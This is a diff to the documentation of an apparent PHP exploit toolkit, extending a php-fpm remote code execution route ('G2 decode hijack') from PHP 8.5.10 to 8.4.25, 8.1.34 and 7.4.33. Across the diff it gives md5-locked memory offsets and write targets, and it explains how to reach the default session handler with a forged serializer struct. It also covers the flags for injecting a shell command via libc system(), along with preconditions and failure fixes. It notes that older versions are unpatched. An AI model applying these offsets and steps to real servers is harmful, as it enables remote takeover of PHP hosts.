@@ -9,7 +9,7 @@ Install, layout and run one-liners: see `README.md`. This file is the lane matri
 | modphp machinery | libphp.so PHP 8.5.10 NTS, httpd prefork | `producer_modphp` filename length N ladder | tiny multipart plus GET arms | HTTP 200, 149 B fatal transcript, worker survives | dry wired, live gated |
 | modphp app unserialize | lab unserialize endpoint | `producer_unser` master shape class payload | tiny multipart plus GET arms | HTTP 200, fatal transcript at the class tried alloc, worker survives | dry wired, live gated by `--unser-url` |
 | fpm app fatal | php-fpm 8.5.10 static pool | post startup app level fatal inside the unserialize family | none | worker exits 70, no access row | measured, not a route by itself |
-| fpm G2 decode hijack | php-fpm 8.5.10 ET_EXEC, ASLR off | `E_USER_ERROR` bailout inside `unserialize` | multipart session record plus forced END decode | marker created, worker survives, decode pointer overwritten | confirmed lab, offline `--step g2` |
+| fpm G2 decode hijack | php-fpm 8.5.10, 8.4.25, 8.1.34, 7.4.33 ET_EXEC, ASLR off | `E_USER_ERROR` bailout inside `unserialize` | multipart session record plus forced END decode | marker created, worker survives, decode pointer overwritten | 8.5.10 confirmed lab; other profiles derived, offline `--step g2` |
 | modphp in band leak | libphp.so PHP 8.5.10 NTS PIE | M5 plant and trigger | `sidlen` / `sidhex` overread | live session array pointer over HTTP, 4 of 4 runs | measured, `leak_offset` build specific |
 | real apps | MediaWiki/Wikibase, WordPress/WooCommerce | anonymous app request | app specific | Wikibase fatal and worker survival, WP 1 of 4 consumers SIGSEGV | reachability and availability, no RCE |
 
@@ -36,29 +36,63 @@ Install, layout and run one-liners: see `README.md`. This file is the lane matri
 | `producer` | no, unless `--live` | request bytes and `result.json` |
 | `write_stage` | never | final forged multipart bytes |
 | `leak` | never | dry modphp calibration plan |
-| `g2` | never | `g2-record.bin` and plan JSON |
+| `g2` | never | `g2-record.bin`, profile, md5 and plan JSON |
 | `chain` | modphp sequence dry by default; fpm legacy path is live | per-candidate receipt |
 
 ## G2 plan
 
-G2 is the confirmed FPM route on the plain PHP 8.5.10 build. A controlled bailout
-leaves a stale `BG(unserialize)` dtor chain. The pre RINIT upload progress session
-decode reuses it, and the typed zval write reaches `ps_serializers[2].decode` in
-`.data`. The forced END decode then calls the overwritten pointer with the session
-record bytes as `rdi`.
+G2 is the confirmed FPM route on the plain PHP 8.5.10 build, with derived profiles
+for 8.4.25, 8.1.34 and 7.4.33. A controlled bailout leaves a stale
+`BG(unserialize)` dtor chain. The pre RINIT upload progress session decode reuses
+it, and the typed zval write reaches `ps_serializers[2].decode` in `.data`. The
+forced END decode then calls the overwritten pointer with the session record bytes
+as `rdi`.
 
 Inputs, all explicit:
 
 | flag | meaning | default |
 |---|---|---|
+| `--g2-profile` | profile version, binary md5 or `.json` path | 8.5.10 |
 | `--g2-x` | session record buffer `zend_string` X | required |
 | `--g2-p` | stale `php_unserialize_data` P | required |
 | `--g2-b0` | stale `var_dtor_entries` B0 | required |
 | `--g2-total` | session record length | profile lab geometry, 131014 |
-| `--g2-target` | 16 byte aligned write target | `ps_serializers[2].decode`, 0x14c1b60 |
+| `--g2-target` | 16 byte aligned write target | `ps_serializers[2].decode` from the selected profile |
 | `--g2-value` | serialized long written at the target | `i:1;` |
 | `--libc-base` | libc base; `system = base + 0x53090` | none |
 | `--command` | shell command, padded to 32 bytes, must end `#` | `id;exit;#` |
+
+Profiles are md5 locked. `PROFILE_MD5` in `tool/modules/g2_chain.py` maps each md5
+to one JSON; a version label is only a convenience key. A binary whose md5 is not
+in the table has no profile.
+
+| version | md5 | decode target A | PS(serializer) | `zend_eval_string` | ELF | evidence |
+|---|---|---|---|---|---|---|
+| 8.5.10 | `825470df6b9fa7d0178a1a9bcf4ce6dc` | 0x14c1b60 | 0x14c6160 | 0x9cfd10 | ET_EXEC | live G2, marker created |
+| 8.4.25 | `95cca39b95cb5f2d5b897fc5cc6e8628` | 0xe01180 | 0xe03a60 | 0x873790 | ET_EXEC | built non PIE FPM binary, offsets derived, no live run |
+| 8.1.34 | `6ea2762ef76f44674805736e19570bb1` | 0xe01140 | 0xe02fb0 | 0x7ec4d5 | ET_EXEC | built non PIE FPM binary, offsets derived, no live run |
+| 7.4.33 | `9c7b5c2287fdebe6b3324223034715da` | 0xe010a0 | 0xe02df0 | 0x7cd5ab | ET_EXEC | built non PIE FPM binary offsets, no live G2; write shape reproduced 4/4 |
+
+All four are ET_EXEC non PIE with image base 0x400000. The
+`ps_serializers[2].decode` and `PS(serializer)` slots are 16 byte aligned in all
+four. Each profile carries libc `system` offset 0x53090 and `popen` 0x7ff90.
+
+Handler choice matters. The lab uses `php_binary`, whose decode slot is
+`table + 0x40` and 16 byte aligned. The default `php` serializer decode slot is
+`table + 0x28` and is not 16 byte aligned, so the typed write cannot land there.
+For the default `php` handler, target `PS(serializer)` at `ps_globals + 0x160`
+for 8.4/8.5 or `+0x130` for 8.1/7.4, and write a pointer to a 24 byte fake
+`ps_serializer` struct in the record (name at +0, encode at +8, decode at
++0x10). Use `--g2-target <PS(serializer)>` with
+`--g2-value 'i:<decimal fake struct address>;'`. The plan emits
+`ps_serializer_slot`, and the profile records the fake struct layout. The second
+slot writes at `target + 16` and zeroes the type at `target + 24`, so verify the
+neighboring `ps_globals` fields before using this route.
+
+`zend_eval_string` and `zend_eval_stringl` are recorded in each profile but are
+not decode targets: `zend_eval_string` receives `ZSTR_LEN` as `rsi`, and
+`zend_eval_stringl` treats a non NULL `retval_ptr` as a zval and does
+`ZVAL_COPY_VALUE`, a wild write for a nonzero length.
 
 `--g2-value` and `--libc-base` are mutually exclusive. The profile binds the
 system offset `0x53090` to the lab glibc; the binary imports no `system` symbol,
@@ -96,6 +130,10 @@ Expected record: 131014 bytes, sha256
 `used_slots -8796082913867`, `p_off 94184`, `b_off 106472`, `payload_start 63`,
 `L 130949`, `system 0x7ffff7cef090`.
 
+`--g2-profile` selects offsets only. X, P, B0, the libc base and the record
+length remain target specific; do not reuse the 8.5.10 receipt geometry on
+another build.
+
 Self-checks run before the record is written: 32 byte key, serialized long,
 target 16 byte alignment, negative `used_slots`, second slot below B0, fake P
 and fake B0 inside the payload, record length convergence. A failed check or a
@@ -105,7 +143,9 @@ G2 preconditions and limits:
 
 | item | requirement |
 |---|---|
-| binary | non PIE so the table is fixed, or a binary base leak; the profile is one build |
+| binary | md5 locked profile; ET_EXEC non PIE at image base 0x400000, or a binary base leak |
+| profile | select by md5 or version label; a binary md5 mismatch invalidates every offset |
+| serializer | `php_binary` decode is 16 byte aligned; the default `php` handler uses the `PS(serializer)` slot plus a fake 24 byte struct |
 | libc | base for `system`, or a fixed target that accepts `(char *, size_t)`; the fixed target route is not demonstrated |
 | heap | X, P, B0 and the exact record length |
 | FPM setup | upload progress on with the forced END update in the same request |
@@ -113,10 +153,14 @@ G2 preconditions and limits:
 | retries | single shot per plant; the corrupt decode pointer persists until worker restart |
 | ASLR | off in the lab; the ASLR capable heap leak is open (F14) |
 
-Confirmed in two plant runs (n=7, n=11), same worker, marker created. A wrong X
-either leaves the plant chain in place or crashes `var_push`; a wrong record
-length can crash the second decode. No claim is made for other session savers,
-opcache, ZTS or shared pools.
+Confirmed on 8.5.10 in two plant runs (n=7, n=11), same worker, marker created.
+The 8.4.25, 8.1.34 and 7.4.33 profiles are derived from built non PIE FPM
+binaries and were not run live. A wrong X either leaves the plant chain in place
+or crashes `var_push`; a wrong record length can crash the second decode. No
+claim is made for other session savers, opcache, ZTS or shared pools. 5.x cannot
+reuse this geometry: `php_unserialize_data` has a different field order,
+`used_slots` is at `+0x2000`, `next` at `+0x2008`, the bound is equality, and
+`BG(unserialize)` is a struct.
 
 ## modphp machinery lane
 
@@ -155,20 +199,25 @@ opcache, ZTS or shared pools.
 | 8.4 | 8.4.25 (source) | 8.4.27 | 8.4.26 is structurally identical to 8.4.25 |
 | 8.3 | 8.3.27 (source) | 8.3.36 | same early reset |
 | 8.2 | 8.2.29 (source) | 8.2.35 | same early reset |
-| 8.1, 8.0, 7.x, 5.x | EOL, unpatched | none | 7.4.33 write reproduced 4/4 |
+| 8.1, 8.0, 7.x, 5.x | EOL, unpatched | none | 7.4.33 write reproduced 4/4; 5.x G2 geometry differs |
 
-G2 offsets by build, keyed by binary, not by version:
+G2 offsets by build, keyed by binary md5, not by version:
 
-| version | decode target A | PS(serializer) | ELF | evidence |
-|---|---|---|---|---|
-| 8.5.10 | 0x14c1b60 | 0x14c6160 | ET_EXEC | live G2, marker created |
-| 8.4.25 | 0xe01180 | 0xe03a60 | ET_EXEC | static derivation, no live run |
-| 8.1.34 | 0xe01140 | 0xe02fb0 | ET_EXEC | static derivation, no live run |
-| 7.4.33 | 0xe010a0 | 0xe02df0 | ET_EXEC | static derivation; the write shape was reproduced 4/4, G2 not run live |
+| version | md5 | decode target A | PS(serializer) | `zend_eval_string` | ELF | evidence |
+|---|---|---|---|---|---|---|
+| 8.5.10 | `825470df6b9fa7d0178a1a9bcf4ce6dc` | 0x14c1b60 | 0x14c6160 | 0x9cfd10 | ET_EXEC | live G2, marker created |
+| 8.4.25 | `95cca39b95cb5f2d5b897fc5cc6e8628` | 0xe01180 | 0xe03a60 | 0x873790 | ET_EXEC | built non PIE FPM binary, offsets derived, no live run |
+| 8.1.34 | `6ea2762ef76f44674805736e19570bb1` | 0xe01140 | 0xe02fb0 | 0x7ec4d5 | ET_EXEC | built non PIE FPM binary, offsets derived, no live run |
+| 7.4.33 | `9c7b5c2287fdebe6b3324223034715da` | 0xe010a0 | 0xe02df0 | 0x7cd5ab | ET_EXEC | built non PIE FPM binary offsets, no live G2; write shape reproduced 4/4 |
 
 The fix does not remove the write primitive; it removes the stale global that
 lets the attacker choose P and B0. `ps_serializers` and `ps_globals` are build
-specific, so key on md5 or build id.
+specific, so key on md5 or build id. The default `php` handler decode slot is not
+16 byte aligned; use the `PS(serializer)` slot and a fake 24 byte
+`ps_serializer` struct. 5.x cannot reuse this geometry: `php_unserialize_data`
+is `{first, last, first_dtor, last_dtor}`, dtor entries use `zval *data[1024]`
+with `used_slots` at `+0x2000` and `next` at `+0x2008`, the bound is equality, and
+`BG(unserialize)` is a struct not a pointer.
 
 ## Real targets
 
@@ -189,7 +238,7 @@ specific, so key on md5 or build id.
 | address profile | `addresses/apache_libphp.json`, per binary offsets and lane | 40492240 B, md5 `92f76e84a77bf8b56c45c3868fa29a6c`, p_align 0x1000 |
 | five resolved symbols | `zif_system` 0x40cc80, `zif_passthru` 0x40cc90, `zend_call_function` 0x540500, `zend_llist_remove_tail` 0x5d39a0, `zval_ptr_dtor` 0x5f0980 | deltas 0xb0480 and 0x1c6d10 |
 | engine symbols | `php_url_encode` 0x460d70, `ps_globals` 0xa3b020, `basic_globals` 0xa3bdc0, `php_apache_sapi_ub_write` 0x5f7ee0, `zend_rc_dtor_func` 0x96f760 | PS(id) offset 16, PS(http_session_vars) offset 360 |
-| G2 profile | `addresses/g2_fpm_8510.json` | table 0x14c1b20, `php_binary` decode 0x14c1b60, call `*0x10(%rax)` at 0x83db66, libc system 0x53090 |
+| G2 profiles | `addresses/g2_fpm_8510.json`, `g2_fpm_8425.json`, `g2_fpm_8134.json`, `g2_fpm_7433.json` | 8.5.10 table 0x14c1b20, decode 0x14c1b60; 8.4.25 0xe01180; 8.1.34 0xe01140; 7.4.33 0xe010a0; all md5 locked, libc system 0x53090 |
 | profile pack build | `universal/profile_builder.py` reads `nm` and `readelf` and writes `addresses/*.json` | new target needs `profiles.py` TARGETS plus BINARY_PROFILES |
 
 ## Failure diagnosis
@@ -203,7 +252,9 @@ specific, so key on md5 or build id.
 | arm returns `0` with no OOM | modphp `memory_limit` knob absent or 128M build default | phpinfo `memory_limit` | set the knob, the producer refuses pre flight |
 | same sid requests time out | session file flock queue | session save path lock holders | use a fresh sid except in the deliberate stale stage |
 | g2 exits 2, missing address | X, P or B0 not supplied | `result.json` error lists the missing flag | pass all three; the plan never guesses |
+| g2 exits 2, unknown profile | version label, md5 or path not in the registry | `result.json` error lists valid labels | use a profile version, md5, or `.json` path |
 | g2 exits 2, no transport | `--live` passed to an offline step | `result.json` says no transport | drop `--live` |
+| g2 default php handler | php decode slot is not 16 byte aligned; a target at `table + 0x28` fails | `result.json` target and `ps_serializer_slot` | target `PS(serializer)` and write a fake struct pointer |
 | g2 command error | command does not end `#` or is longer than 32 bytes | `result.json` error | trim and end with `#` |
 | g2 target error | target not 16 byte aligned, or not reachable from B0 | `result.json` error | use an aligned target below B0 + 0x10 |
 | g2 P or B0 outside payload | wrong X or total | check `p_off`, `b_off`, `payload_start` in `result.json` | re-measure X or the record length |
